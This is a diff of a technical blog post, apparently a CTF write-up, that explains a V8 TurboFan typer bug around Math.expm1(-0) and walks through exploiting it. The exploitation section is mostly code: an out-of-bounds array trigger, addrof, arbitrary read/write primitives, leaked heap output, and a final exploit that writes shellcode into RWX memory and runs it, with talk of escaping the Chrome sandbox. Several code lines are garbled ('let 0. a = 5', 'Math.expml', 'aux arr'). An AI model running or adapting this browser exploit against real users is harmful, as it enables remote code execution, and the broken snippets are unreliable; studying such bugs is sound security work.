@@ -5,27 +5,46 @@ draft: false
 tags: ["math.expm1", "typer", "OOB"]
 ---
 
-We answer the question: Is `Math.expm1(-0)` actually `-0` ?
+In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process. 
 <!--more-->
+We'll break down how this edge case is misoptimized by V8's Turbofan compiler, explore the root cause of the issue, and demonstrate how this leads to unexpected behavior.
+
+For context, we’ll focus on the technical aspects surrounding the typer phase and its consequences for browser exploitation.
+
+## Background on Math.expm1
+The `Math.expm1(x)` function calculates `e^x - 1` with improved precision for small values of `x`. For example:
+
+- `Math.expm1(0)` returns `0`
+- `Math.expm1(-0)` returns `-0`, due to the handling of signed zeros in JavaScript.
+
+This distinction is significant in JavaScript, where `0` and `-0` behave differently in equality comparisons and mathematical operations. According to the ECMAScript specification, `Math.expm1(-0)` should return `-0`, but a bug in V8's optimization pipeline causes it to be incorrectly handled.
+
+## Expected Behavior of Math.expm1(-0)
+The ECMAScript spec mandates that `Math.expm1(-0)` must return `-0`. This behavior is critical when dealing with negative zero in JavaScript. Here’s why:
+
+- `0` and `-0` are distinct values in JavaScript, despite being equal according to `==` and `===`.
+- However, `Object.is(0, -0)` correctly returns `false`, recognizing the difference between the two.
+When `Math.expm1(-0)` is mishandled during optimization, it leads to incorrect behavior in cases where signed zeros are important.
 
 ## Understanding the bug:
-- typer runs
-    - typer phase.
-    - TypeNarrowingReducer - load elimination phase.
-    - simplified lowering phase. 
-- math.expm1(-0) is always -0, but the typer is making a mistake of `range` as (plainNumber, NaN) but -0 is not a plain number or a NaN. 
+The typer processes the code by executing several phases:
 
+- **Typer Phase**: Determines the types of various nodes in the graph.
+- **TypeNarrowingReducer**: Eliminates unnecessary loads based on narrowed types.
+- **Simplified Lowering Phase**: Applies further optimizations by lowering nodes into simpler operations.
+In the case of `Math.expm1(-0)`, the result should always be `-0`. However, the `typer` mistakenly classifies the range as `(plainNumber, NaN)`, when in fact, `-0` is neither a `plain number` nor a `NaN`, leading to an incorrect assumption during `type analysis`.
 ![idek4](/images/math_expm_bug/image-3.png)
 
 ## Object.is()
-
-> 1- Initial phase
-- The typer assigns this as a SameValue node in IR 
+### 1- Initial Phase:
+- The `typer` assigns the `Object.is()` node as a `SameValue` node. This can be seen in [turbolizer](https://v8.github.io/tools/head/turbolizer/index.html).
 
 ![initial](/images/math_expm_bug/image.png)
 
-> 2- TypedOptimization - ReduceSameValue
-```
+### 2- Typed Optimization: 
+- In this phase, `SameValue` is further reduced to `ObjectIsMinusZero()` when either side of the comparison involves `-0`. This makes comparisons more efficient by focusing on the specific case of `-0`.
+
+```c++
 else if (lhs_type.Is(Type::MinusZero())) {
     // SameValue(x:minus-zero,y) => ObjectIsMinusZero(y)
     node->RemoveInput(0);
@@ -41,8 +60,10 @@ else if (lhs_type.Is(Type::MinusZero())) {
 
 ![idek1](/images/math_expm_bug/image-1.png)
 
-> 3- simplified lowering
-```
+### 3- Simplified Lowering:
+- This phase further optimizes the `ObjectIsMinusZero()` node. If the input is confirmed to be `-0`, the node is simplified and deferred for replacement, enhancing overall efficiency.
+
+```cpp
 case IrOpcode::kObjectIsMinusZero: 
 Type const input_type = GetUpperBound(node->InputAt(0));
 if (input_type.Is(Type::MinusZero())) {
@@ -53,66 +74,84 @@ if (input_type.Is(Type::MinusZero())) {
 }
 ```
 
-![idek2](/images/math_expm_bug/image-2.png)
-
-## Patch and the bug details:
-
-- Math.expm1 gets converted to a (Float64Expm1 and ChangeFloat64ToTagged) which will just truncate the -0 to a 0
-- Using a call node, inbuilt v8 math.expm1 we can avoid this.
-- The patch is applied only to the typer.cc and not the operation-typer so we can produce a call node from the v8 builtins to get the math.expm1 in v8 which still has the incorrect type assumtions set.
+## Patch and Bug Details:
+- The `Math.expm1()` operation is incorrectly converted to a combination of `Float64Expm1` and `ChangeFloat64ToTagged`, which causes `-0` to be truncated to `0`.
+- By using a `Call` node and invoking the inbuilt V8 `Math.expm1`, this truncation issue can be avoided.
+- The patch has only been applied to `typer.cc` but not to `operation-typer`, allowing the creation of a `Call` node using V8 builtins to correctly handle `Math.expm1`, even though it still makes incorrect type assumptions.
 
 ![ide](/images/math_expm_bug/image-4.png)
 
-## Pipeline of turbofan:
-![idk](/images/math_expm_bug/image-5.png)
+This patch addresses the issue in `typer.cc`, but a more comprehensive solution requires changes in other parts of the type system to fully fix the handling of `-0` in `Math.expm1`.
 
-## Typer phase:
-- Go through all the nodes and send it to GraphReducer.
-- Try to associate the type with the following node.
+## Pipeline of TurboFan:
+![Pipeline of TurboFan](/images/math_expm_bug/image-5.png)
 
-## Type lowering:
-- does a shit ton of optimisation like
+TurboFan’s pipeline consists of multiple phases that optimize and lower JavaScript code into highly optimized machine code. The key stages include type inference, node optimization (such as `SameValue` being converted to checks like `ObjectIsMinusZero`), and various lowering phases that simplify and optimize the code.
 
-![bob](/images/math_expm_bug/image-7.png)
+## Typer Phase:
+- The typer traverses all the nodes in the intermediate representation (IR) and processes them through the GraphReducer.
+- For each node, it attempts to assign the most accurate type information, optimizing how the node will be executed in subsequent phases.
+
+## Type Lowering:
+- This phase focuses on extensive optimizations, including refining operations and simplifying nodes for better performance in the backend stages of Turbofan.
+![Type Lowering Phase](/images/math_expm_bug/image-7.png)
 
 ## Ecape analysis:
-![bob](/images/math_expm_bug/image-6.png)
+```js
+function f() {
+  let o = {a: 5};
+  return o.a;
+}
+```
+> Clearly, it can be rewritten as:
 
-## Simplified lowering:
-- Has a lot more cases to optimization.
+```js
+function f() {
+  let 0. a = 5;
+  return o_a;
+}
+```
+[Great Video on Escape Analysis](https://www.youtube.com/watch?v=KiWEWLwQ3oI&ab_channel=NightHacking)
+
+## Additional Optimizations
+- If you're interested, you can find more information about V8 TurboFan's optimizations in the documentation [here](https://v8.dev/docs/turbofan).
 
 ## Exploitation:
+- **Problem:** The `sameValue` variable is of boolean type, which leads to the type assumption of (0, 1337), resulting in no out-of-bounds (OOB) access.  
+![bob](/images/math_expm_bug/image-8.png)  
+![bob](/images/math_expm_bug/image-9.png)  
 
-- Problem: Our sameValue has type of boolean that made the type assumption of (0, 1337) and hence no OOB access. 
-![bob](/images/math_expm_bug/image-8.png)
-![bob](/images/math_expm_bug/image-9.png)
+- As mentioned in the blog, we need to retain the `sameValue` node until the final optimization, folding it to `true`. This means the compiler shouldn't be aware that we're comparing with `-0` until the very last optimization step.  
 
-- Like the blog said we have to keep the samevalue node until the last optimization and fold it to be true. Which means the compiler should'nt know that we are comparing with -0 untill the last optimization.
-- in escape analysis we can fix the -0 to the object.is() and in simplified lowering we get our desired range value and hence a removal of the checkbounds because the `assumed` return type is false and it will always be inside the array limits. hopefully.
+- In escape analysis, we can replace -0 with `Object.is()`, and during simplified lowering, we achieve the desired range value, allowing us to remove the bounds check. The `assumed` return type becomes false, ensuring that it will always remain within the array limits.  
 
-> #79:CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]
+> #79: CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]  
 
-![idekde](/images/math_expm_bug/image-10.png)
+![idekde](/images/math_expm_bug/image-10.png)  
 
-## OOB Array creation:
-- Using the OOB array access we can just leak the addrof objects if we keep it nearby to a float array.
-- After a lot of trial and error and lot of monkey patching I finally found a way to get memory leak kinda better.
-```py
-function addrof(x, i=1){
+## OOB Array Creation:
+- By exploiting out-of-bounds (OOB) array access, we can leak the addresses of objects by keeping them close to a float array. After much trial and error, along with extensive monkey patching, I finally discovered a more effective method for achieving a memory leak.
+
+```javascript
+function addrof(x, i = 1) {
     let a = [1.1, 2.2, 3.3];
     let b = [5.5, 5.5, 5.5, 5.5, 5.5];
-    let o = {m: -0};
+    let o = { m: -0 };
     let t = Object.is(Math.expm1(x), o.m) + 0;
-    t *= (i+0); // i to integral.
+    t *= (i + 0); // Convert i to an integral type.
     let val = a[t];
     oob_rw_buffer = b;
     return val;
 }
 ```
-- a is the array to get out of bounds. b is the array where I want to change the length field.
-- tricky stuff: the parameter value `i` is not having much type, So I added it with 0 to make sure the type gets fixed to the integral type. Now the feedback along with this will make out oob read possible. silly JS engine. 
-- finally storing the context of b into oob_rw_buffer. Given below is the rough leak after the fixed array of `a`.
 
+- Here, `a` is the array from which we want to access out-of-bounds values, while `b` is the array where we intend to manipulate the length field.  
+
+- **Tricky Part:** The parameter `i` has an ambiguous type, so I added `0` to it to ensure it is treated as an integral type. This adjustment, along with the feedback, enables the OOB read. Silly JavaScript engine!  
+
+- Finally, I'm storing the context of `b` in the `oob_rw_buffer`. Below is a rough illustration of the leak following the adjustment to the fixed array `a`.
+
+**Leaks of the current state:**
 ```
 3) int: 0x7a7e2501459
 4) int: 0x500000000
@@ -121,10 +160,10 @@ function addrof(x, i=1){
 7) int: 0x4016000000000000
 8) int: 0x4016000000000000
 9) int: 0x4016000000000000
-10) int: 0x375928582cf9   - (map of b)
-11) int: 0x7a7e2500c21    - (property of b)
-12) int: 0x65ad13cc1c9    - (element backing pointer of b)
-13) int: 0x500000000      - (length field)
+10) int: 0x375928582cf9    - (map of b)
+11) int: 0x7a7e2500c21     - (property of b)
+12) int: 0x65ad13cc1c9     - (element backing pointer of b)
+13) int: 0x500000000       - (length field)
 14) int: 0x7a7e2500561
 15) int: 0x8000000000000000
 16) int: 0x3ff199999999999a
@@ -133,26 +172,49 @@ function addrof(x, i=1){
 19) int: 0x3ff199999999999a
 ```
 
-### Addrof primitive:
-- Since we have the OOB array and having a another array after helps us to achieve a oob array read hence having a addrof primitive.
-![bob](/images/math_expm_bug/image-11.png)
+### Addrof Primitive:
+- With the OOB array in place, having another array afterwards allows us to perform an OOB array read, thus enabling the creation of an `addrof` primitive.  
 
-### Arb read/ Arb write:
-- We can just store the ArrayBuffer after all the allocations and calculate the offset difference between the arraybuffer and oob array and use that to get arb_read and arb_write.
 ```js
-function arb_write(addr, val){
-    oob_rw_buffer[diff/8n] = addr.i2f();
+let oob_rw_buffer = undefined;
+let aux_arr = undefined;
+function addrof(obj){
+  aux_arr[0] = obj;
+  return oob_rw_buffer[0x12];
+}
+function stagel(x, i=1){
+  let a = [1.1, 2.2, 3.3];
+  let b = [5.5, 5.5, 5.5, 5.5, 5.5];
+  let c = [{}, 1, 2];
+  let o = {m: -0};
+  let t = Object.is(Math.expml(x), o.m) + 0;  // trigger the bug.
+  t *= (i+0);                                 // i to inegral.
+  a[t] = 1024*1024;
+  oob_rw_buffer = b;                          // expose b to global scope
+  aux arr = c;
+  return 0;
+}
+```
+
+### Arb Read / Arb Write:
+- By storing the `ArrayBuffer` after all the allocations, we can calculate the offset difference between the `ArrayBuffer` and the OOB array. This enables us to perform arbitrary read and write operations.
+
+```javascript
+function arb_write(addr, val) {
+    oob_rw_buffer[diff / 8n] = addr.i2f();
     dv.setBigUint64(0, val, true);
 }
 ```
-```js
-function arb_read(addr){
-    oob_rw_buffer[diff/8n] = addr.i2f();
+
+```javascript
+function arb_read(addr) {
+    oob_rw_buffer[diff / 8n] = addr.i2f();
     return dv.getBigUint64(0, true);
 }
 ```
 
 ## Final Exploit:
+> This is the final exploit I've developed, ready to target the V8 engine. However, to ensure reliability for Chrome, I need to correct the objects I corrupted and proceed with caution. If we manage to escape the Chrome sandbox, it’s game over.
 
 ```js
 // ------------------------------------------------ Utility- Functions ------------------------------------------------ //
@@ -256,19 +318,18 @@ shell_write(rwx, shellcode);
 func(); 
 ```
 
-## Debugging stuff:
-- Helper code for GDB is basically located in src/objects-printer.cc
-- Node structure for all the sea of nodes. 
+## Debugging Tools:
+- The helper code for GDB can be found in `src/objects-printer.cc`.
+- The node structure comprises a variety of nodes, including:
   - **Methods:**
-  - New, clone, isDead, kill...
+    - `new`, `clone`, `isDead`, `kill`, etc.
   - **Variables:**
-  - like op(description of the computation):
-    - opcode related
-    - properties 
+    - Includes operation descriptions (e.g., `opcode` related) and properties.
 
-  - --trace-turbo: to get the thingy for turbolizer graph.
-  - --trace-representation: it gives out the feedback types and info about each of the optimization phases. 
+- Use the following flags for additional insights:
+  - `--trace-turbo`: Generates the Turbolizer graph.
+  - `--trace-representation`: Provides feedback types and information about each optimization phase.
 
-## Links:
-- https://abiondo.me/2019/01/02/exploiting-math-expm1-v8
-- https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
+## Useful Links:
+- [Exploiting Math.expm1 in V8](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8)
+- [Krautflare: A Deep Dive](https://www.jaybosamiya.com/blog/2019/01/02/krautflare/)
